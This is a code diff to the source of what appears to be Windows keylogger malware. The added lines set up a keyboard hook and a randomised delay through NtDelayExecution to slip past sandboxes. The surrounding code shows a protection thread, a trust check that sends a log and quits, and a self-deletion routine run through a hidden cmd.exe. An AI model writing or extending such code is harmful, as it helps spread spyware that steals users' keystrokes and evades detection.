@@ -9,6 +9,10 @@
 #pragma warning( push )
 #pragma warning( disable : 4477 )
 
+typedef LONG(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
+PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
+
+HHOOK keyboardHook;
 
 int main()
 {
@@ -29,18 +33,22 @@ int main()
 
 #ifndef debug
 
-
-    int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;
-
-    for (int j = 0; j <= Divider; j++) {
-        Sleep(DividedSleep);
-    }
-
     unsigned long ThreadId;
     CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
 
 
 #endif
+
+    if (DelayExecution) {
+        int Divider = rand() % 10000 + 100, DividedSleep = (DelayTime + rand()%1000+10) / Divider;
+        LARGE_INTEGER delay;
+        delay.QuadPart = -10000 * ((int)DividedSleep * 1000);
+        pNtDelayExecution(FALSE, &delay);
+        for (int j = 0; j <= Divider; j++) {
+            Sleep(DividedSleep);
+        }
+
+    }
 
     bool FirstLog = true;
 
@@ -175,9 +183,10 @@ Log:
     }
 
     if (TrustTooLow) {
+        log.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
         log.LogItChar("Trust factor too low, quitting...");
         log.SendLog();
-        FinalExit();                                                                              //could just act normal instead of autodeleting, which is sus
+        FinalExit();                                                                               //could just act normal instead of autodeleting, which is sus
     }
 
     DWORD Size = MAX_LENGTH+1;
@@ -190,7 +199,7 @@ Log:
 
     DWORD DWFlags;
 
-    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) { //switch between these two ways to check as you see fit, or even use both
+    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {    //switch between these two ways to check as you see fit, or even use both
     if (InternetGetConnectedState(&DWFlags,NULL)){
         InternetStatusString = "Connected";
     }else{
@@ -805,6 +814,7 @@ void FinalExit() {
     ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
     exit(0);
 }
+
 
 
 #pragma warning( pop )
